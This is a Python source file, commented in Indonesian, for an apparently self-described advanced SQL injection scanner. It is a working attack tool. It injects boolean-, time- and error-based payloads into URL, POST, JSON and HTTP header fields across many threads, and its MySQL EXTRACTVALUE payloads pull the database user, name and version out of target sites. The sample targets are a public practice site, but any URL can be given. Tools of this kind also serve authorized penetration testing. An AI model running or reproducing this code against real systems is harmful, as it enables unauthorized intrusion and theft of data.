import requests
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import threading
import json
from copy import deepcopy
import re # Diperlukan untuk ekstraksi data eksploitasi

# Nonaktifkan peringatan jika menggunakan verify=False
# import requests.packages.urllib3
# requests.packages.urllib3.disable_warnings()

class AdvancedSQLiScanner:
    def __init__(self, base_target_url, method='GET', post_data=None, json_data=None, headers=None, verify_ssl=True):
        self.base_target_url = base_target_url
        self.method = method.upper()
        self.post_data = post_data or {}
        self.json_data = json_data or {}
        self.verify_ssl = verify_ssl
        
        self.session = requests.Session()
        self.vulnerabilities = {}
        self.exploited_data = {} # Baru: Untuk menyimpan data hasil eksploitasi
        self.dbms_type = None # Baru: Untuk menyimpan jenis DB yang terdeteksi
        self.lock = threading.Lock()
        self.dbms_lock = threading.Lock() # Lock khusus untuk mengatur self.dbms_type
        
        self.base_headers = headers or {
            'User-Agent': 'Mozilla.5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        self.session.headers.update(self.base_headers)
        self.headers_to_test = ['User-Agent', 'Referer', 'Cookie', 'X-Forwarded-For']

        # --- Payload yang Dikategorikan ---
        
        # 1. Payloads untuk konteks STRING (e.g., 'value')
        self.boolean_string_payloads = [
            {'true': "' AND '1'='1'--", 'false': "' AND '1'='2'--"},
            {'true': '" AND "1"="1"--', 'false': '" AND "1"="2"--'},
            {'true': "') AND ('1'='1'--", 'false': "') AND ('1'='2'--"},
        ]
        self.time_string_payloads = [
            {'payload': "' AND SLEEP(3)--", 'sleep_time': 3, 'dbms': 'mysql'},
            {'payload': "' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--", 'sleep_time': 3, 'dbms': 'mysql'},
            {'payload': "' WAITFOR DELAY '0:0:3'--", 'sleep_time': 3, 'dbms': 'mssql'},
            {'payload': "' AND 1=pg_sleep(3)--", 'sleep_time': 3, 'dbms': 'postgresql'},
        ]

        # 2. Payloads untuk konteks NUMERIC (e.g., 123)
        self.boolean_numeric_payloads = [
            {'true': " AND 1=1", 'false': " AND 1=2"},
            {'true': " OR 1=1", 'false': " OR 1=2"},
        ]
        self.time_numeric_payloads = [
            {'payload': " AND SLEEP(3)", 'sleep_time': 3, 'dbms': 'mysql'},
            {'payload': " AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)", 'sleep_time': 3, 'dbms': 'mysql'},
            {'payload': " WAITFOR DELAY '0:0:3'", 'sleep_time': 3, 'dbms': 'mssql'},
            {'payload': " AND 1=pg_sleep(3)", 'sleep_time': 3, 'dbms': 'postgresql'},
        ]

        # 3. Payloads untuk EKSPLOITASI (Error-Based) - Hanya MySQL untuk contoh ini
        self.error_exploit_payloads = [
            # Ambil User
            {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT USER())))--", "regex": r"XPATH syntax error: '~(.*?)'"},
            # Ambil Database
            {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))--", "regex": r"XPATH syntax error: '~(.*?)'"},
            # Ambil Versi
            {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION())))--", "regex": r"XPATH syntax error: '~(.*?)'"},
            # (Tambahkan payload UPDATEXML atau untuk DBMS lain di sini)
        ]

    def _set_dbms(self, dbms):
        """Secara thread-safe mengatur jenis DBMS yang terdeteksi."""
        with self.dbms_lock:
            if self.dbms_type is None:
                self.dbms_type = dbms
                print(f"[INFO] Database terdeteksi pada {self.base_target_url}: {dbms}")

    def _send_request(self, url, method, params=None, data=None, json_data=None, headers_override=None, timeout=10):
        try:
            request_headers = self.session.headers.copy()
            if headers_override:
                request_headers.update(headers_override)
            
            response = self.session.request(
                method, url,
                params=params, data=data, json=json_data,
                headers=request_headers,
                timeout=timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )
            return response
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.RequestException:
            return None

    def _log_vulnerability(self, vector, param_name, vuln_type, payload_type, payload):
        with self.lock:
            key = f"{vector} - {param_name}"
            if key not in self.vulnerabilities:
                self.vulnerabilities[key] = []
            
            log_entry = f"{vuln_type} ({payload_type})"
            if not any(v['type'] == log_entry for v in self.vulnerabilities[key]):
                print(f"[VULNERABLE] {log_entry} terdeteksi pada {vector}: {param_name}")
                self.vulnerabilities[key].append({
                    'type': log_entry,
                    'payload': payload
                })

    def _log_exploit(self, vector, param_name, data, payload):
        """Mencatat data hasil eksploitasi."""
        with self.lock:
            key = f"{vector} - {param_name}"
            if key not in self.exploited_data:
                print(f"[EXPLOITED] Data ditemukan pada {vector} - {param_name}: {data}")
                self.exploited_data[key] = {'data': data, 'payload': payload}

    def _get_baseline(self, vector, **kwargs):
        if vector == 'header':
            response = self._send_request(self.base_target_url, self.method, headers_override=kwargs.get('headers'))
        elif vector == 'json':
            response = self._send_request(self.base_target_url, self.method, json_data=kwargs.get('json_data'))
        else: # default GET/POST
            response = self._send_request(self.base_target_url, self.method, params=kwargs.get('params'), data=kwargs.get('data'))
        
        if response:
            return len(response.content), response.elapsed.total_seconds()
        return -1, -1

    def _test_parameter_injection(self, base_len, base_time, vector_name, param_name, original_value_str, send_req_func):
        """
        Helper terpusat untuk menguji SEMUA jenis injeksi (boolean, time, exploit)
        pada satu parameter.
        """
        vulnerable_found = False

        # --- 1. Test Boolean Payloads (String dan Numerik) ---
        payload_sets_boolean = {"String": self.boolean_string_payloads, "Numeric": self.boolean_numeric_payloads}
        for payload_type, payload_list in payload_sets_boolean.items():
            for pair in payload_list:
                resp_true = send_req_func(original_value_str + pair['true'])
                resp_false = send_req_func(original_value_str + pair['false'])

                if resp_true and resp_false:
                    if len(resp_true.content) == base_len and len(resp_false.content) != base_len and len(resp_false.content) != len(resp_true.content):
                        self._log_vulnerability(vector_name, param_name, 'Boolean-Based', payload_type, pair['true'])
                        vulnerable_found = True
                        break

        # --- 2. Test Time Payloads (String dan Numerik) ---
        payload_sets_time = {"String": self.time_string_payloads, "Numeric": self.time_numeric_payloads}
        for payload_type, payload_list in payload_sets_time.items():
            for item in payload_list:
                # --- LOGIKA CERDAS (FINGERPRINTING) ---
                # Jika DBMS sudah terdeteksi, lewati payload yang tidak relevan
                if self.dbms_type and self.dbms_type != item['dbms']:
                    continue

                payload = item['payload']
                sleep_time = item['sleep_time']

                start = time.time()
                send_req_func(original_value_str + payload, timeout=sleep_time + 5)
                response_time = time.time() - start

                if response_time >= sleep_time * 0.9 and response_time > (base_time + sleep_time * 0.7):
                    self._log_vulnerability(vector_name, param_name, 'Time-Based', payload_type, payload)
                    self._set_dbms(item['dbms']) # ATUR DBMS YANG DITEMUKAN!
                    vulnerable_found = True
                    break

        # --- 3. Test Error-Based EKSPLOITASI ---
        # Hanya jalankan jika kita *sudah* menemukan kerentanan (lebih efisien)
        # Atau jika DBMS adalah MySQL (payload kita spesifik MySQL)
        if vulnerable_found or (self.dbms_type is None) or (self.dbms_type == 'mysql'):
            for item in self.error_exploit_payloads:
                # (Hanya jalankan payload exploit jika sesuai dengan DBMS yang terdeteksi)
                if self.dbms_type and self.dbms_type != 'mysql':
                    continue
                
                payload = item['payload']
                regex = item['regex']
                
                # Kita hanya perlu string-based untuk exploit ini
                response = send_req_func(original_value_str + payload) 
                
                if response and response.text:
                    match = re.search(regex, response.text)
                    if match and match.group(1):
                        data = match.group(1)
                        self._log_exploit(vector_name, param_name, data, payload)
                        break # Cukup satu data

    def _create_worker(self, test_function, items_to_test):
        """Helper untuk membuat worker thread pool."""
        with ThreadPoolExecutor(max_workers=10) as executor:
            for item in items_to_test:
                executor.submit(test_function, item)

    def test_url_parameters(self):
        params_to_test = {}
        if self.method == 'GET':
            parsed_url = urllib.parse.urlparse(self.base_target_url)
            params_to_test = urllib.parse.parse_qs(parsed_url.query)
        elif self.method == 'POST':
            params_to_test = self.post_data
        if not params_to_test: return
            
        base_len, base_time = self._get_baseline('url', params=params_to_test if self.method == 'GET' else None, data=params_to_test if self.method == 'POST' else None)
        if base_len == -1: return

        def _worker(param_item):
            param, value = param_item
            original_value = value[0] if isinstance(value, list) else value
            vector_name = f"URL Param ({self.method})"
            
            def send_req(payload_value, timeout=10):
                current_params = deepcopy(params_to_test)
                if isinstance(current_params.get(param), list): # GET
                    current_params[param] = [payload_value]
                    return self._send_request(self.base_target_url, self.method, params=current_params, timeout=timeout)
                else: # POST
                    current_params[param] = payload_value
                    return self._send_request(self.base_target_url, self.method, data=current_params, timeout=timeout)

            self._test_parameter_injection(base_len, base_time, vector_name, param, str(original_value), send_req)

        self._create_worker(_worker, params_to_test.items())

    def test_http_headers(self):
        base_len, base_time = self._get_baseline('header', headers=self.base_headers)
        if base_len == -1: return

        def _worker(header_name):
            original_header_value = self.base_headers.get(header_name, "")
            
            def send_req(payload_value, timeout=10):
                headers_inj = self.base_headers.copy()
                headers_inj[header_name] = payload_value
                return self._send_request(self.base_target_url, self.method, headers_override=headers_inj, timeout=timeout)

            self._test_parameter_injection(base_len, base_time, 'HTTP Header', header_name, original_header_value, send_req)

        self._create_worker(_worker, self.headers_to_test)

    def test_json_body(self):
        if not self.json_data: return
        base_len, base_time = self._get_baseline('json', json_data=self.json_data)
        if base_len == -1: return

        def _worker(item):
            key, original_value = item
            
            def send_req(payload_value, timeout=10):
                json_inj = deepcopy(self.json_data)
                json_inj[key] = payload_value
                return self._send_request(self.base_target_url, self.method, json_data=json_inj, timeout=timeout)

            self._test_parameter_injection(base_len, base_time, 'JSON Body', key, str(original_value), send_req)
        
        # Kumpulkan item yang valid untuk diuji
        items_to_test = [(k, v) for k, v in self.json_data.items() if isinstance(v, (str, int, float, bool))]
        self._create_worker(_worker, items_to_test)

    def scan_all_vectors(self):
        print(f"[*] Memindai {self.base_target_url}...")
        # Jalankan secara sekuensial agar output tidak campur aduk antar vektor
        self.test_url_parameters()
        self.test_http_headers()
        self.test_json_body()
        return self.vulnerabilities, self.exploited_data

    def generate_report(self):
        if not self.vulnerabilities and not self.exploited_data:
            print(f"[INFO] Tidak ada kerentanan ditemukan pada {self.base_target_url}")
            return

        print("\n" + "="*60)
        print(f"LAPORAN HASIL SCAN v6 - {self.base_target_url}")
        print("="*60)
        
        if self.vulnerabilities:
            print("\n--- [!] KERENTANAN DITEMUKAN ---")
            for key, vulns in self.vulnerabilities.items():
                print(f"\n--- Vektor: {key} ---")
                for vuln in vulns:
                    print(f"  > Tipe    : {vuln['type']}")
                    print(f"  > Payload : {vuln['payload']}")
        
        if self.exploited_data:
            print("\n--- [!!!] DATA BERHASIL DIEKSPLOITASI ---")
            for key, exploit in self.exploited_data.items():
                print(f"\n--- Vektor: {key} ---")
                print(f"  > DATA    : {exploit['data']}")
                print(f"  > Payload : {exploit['payload']}")
                
        print("\n" + "="*60)

# --- FUNGSI UTAMA (ALUR KERJA PROFESIONAL) ---

def scan_target(target_config):
    """Fungsi worker untuk memindai satu target."""
    try:
        if isinstance(target_config, str):
            scanner = AdvancedSQLiScanner(target_config, method='GET')
        elif isinstance(target_config, dict):
            scanner = AdvancedSQLiScanner(
                base_target_url=target_config['url'],
                method=target_config.get('method', 'POST'),
                post_data=target_config.get('post_data'),
                json_data=target_config.get('json_data'),
                headers=target_config.get('headers')
            )
        else: return

        scanner.scan_all_vectors()
        scanner.generate_report() # Laporan akan dicetak setelah selesai
        
    except Exception as e:
        print(f"Error saat memindai {target_config}: {e}")

# --- CONTOH PENGGUNAAN ---
if __name__ == "__main__":
    
    # Ini adalah simulasi output dari tool crawler (e.g., gospider, hakrawler)
    TARGETS_TO_SCAN = [
        # Target ini diketahui rentan terhadap error-based & time-based MySQL
        "http://testphp.vulnweb.com/artists.php?artist=1", 
        "http://testphp.vulnweb.com/listproducts.php?cat=1",
        "http://testphp.vulnweb.com/index.php", # Tes header
    ]

    print(f"--- MEMULAI MESIN PEMINDAI v6 PADA {len(TARGETS_TO_SCAN)} TARGET ---")
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(scan_target, TARGETS_TO_SCAN)

    print("--- SEMUA PEMINDAIAN SELESAI ---")